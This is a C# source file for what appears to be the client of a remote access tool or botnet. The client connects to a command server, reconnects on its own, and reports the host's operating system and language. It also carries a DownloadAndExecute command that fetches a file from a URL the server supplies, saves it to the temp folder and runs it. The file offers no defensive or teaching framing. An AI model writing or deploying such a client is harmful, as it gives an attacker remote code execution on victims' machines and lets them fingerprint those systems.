using Share;
using System;
using System.Net;
using System.Net.Sockets;

namespace Client.Networking
{
    public class ClientSocket
    {
        // Buffer, client socket and the remote server
        private static Socket _socket;
        private static IPEndPoint _remoteAddr;
        private static byte[] _buffer;
        private static Guid _id;

        // Initialize socket based on a remote ip and port
        public ClientSocket(string ipAddr, int ipPort)
        {
            _remoteAddr = new IPEndPoint(IPAddress.Parse(ipAddr), ipPort);
            _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _id = new Guid();

            Console.WriteLine("Connecting to {0}...", _remoteAddr.ToString());

            _socket.BeginConnect(_remoteAddr, ConnectCallBack, null);
        }

        // Begin accepting data from endpoint
        void ConnectCallBack(IAsyncResult result)
        {
            if (_socket.Connected)
            {
                Console.WriteLine("Connected");
                _buffer = new byte[2048];
                _socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(RecieveCallback), null);
            }
            else
            {
                // Server is not running
                Reconnect();
            }
        }

        // Responding to callbacks from endpoint
        void RecieveCallback(IAsyncResult result)
        {
            try {
                byte[] packet = new byte[_socket.EndReceive(result)];
                Array.Copy(_buffer, packet, packet.Length);
                Packet p = new Packet(packet);
                DataManager(p);

                // Clear buffer and start recieving again
                _buffer = new byte[2048];
                _socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(RecieveCallback), null);
            } catch {
                // Server lost connection try reconnecting
                Reconnect();
            }
        }

        void Reconnect() {
            Console.WriteLine("reconnecting to {0}...", _remoteAddr.ToString());
            _socket.Close(1);
            _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _socket.BeginConnect(_remoteAddr, new AsyncCallback(ConnectCallBack), null);
        }
        void DataManager(Packet packet)
        {
            switch (packet.PType)
            {
                case PacketType.ListClient:
                    Packet r = new Packet(PacketType.ListClient, _id.ToString());
                    string[] OSInfo = { Client.Info.GetOSName(), Client.Info.GetOSInfo(), Client.Info.GetLocalLanguage()};
                    r.PData.AddRange(OSInfo);
                    _socket.Send(r.ToBytes());
                    Console.WriteLine("Sending client info");
                    break;
                case PacketType.DownloadAndExecute:
                case PacketType.Download:
                    string filePath = System.IO.Path.GetTempPath() + packet.PData[1];
                    using (WebClient c = new WebClient()) {
                        c.DownloadFile(packet.PData[0], filePath);
                    }
                    if (packet.PType == PacketType.Download) break;
                    System.Diagnostics.Process.Start(filePath);
                    Console.WriteLine("Downloaded {0} and stored at {1}", packet.PData[0], filePath);
                    break;
            }
        }
    }
}
